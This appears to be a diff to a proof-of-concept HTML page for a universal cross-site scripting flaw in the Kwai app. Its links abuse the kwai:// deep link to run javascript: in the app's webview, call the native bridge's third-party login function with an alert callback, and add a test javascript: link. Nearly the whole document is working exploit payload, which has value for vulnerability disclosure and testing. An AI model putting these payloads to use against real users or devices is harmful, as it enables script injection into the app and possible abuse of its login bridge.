@@ -2,6 +2,7 @@
 <head></head>
 <body>
 <h1>Kwai UXSS</h1>
-<a id="link" href="kwai://webview?url=javascript://%250aKwai.setPhysicalBackButton('{%2522onClick%2522:%2522Kwai.verifyThirdPartyLogin(\\'{\\%2522callback\\%2522:\\%2522alert\\%2522,\\%2522platform\\%2522:\\%2522google\\%2522}\\')//%2522}');location='http://kwai.com'">PoC URL</a>
+<a id="link" href="kwai://webview?url=javascript://%250aKwai.setPhysicalBackButton('{%2522onClick%2522:%2522Kwai.verifyThirdPartyLogin(\\\'{\\\%2522callback\\\%2522:\\\%2522alert\\\%2522,\\\%2522platform\\\%2522:\\\%2522google\\\%2522}\\\')//%2522}');location='http://kwai.com'">PoC URL</a>
+<br><a href="javascript://%0aalert(%221\\\%22%22)">TEST</a>
 </body>
 </html>
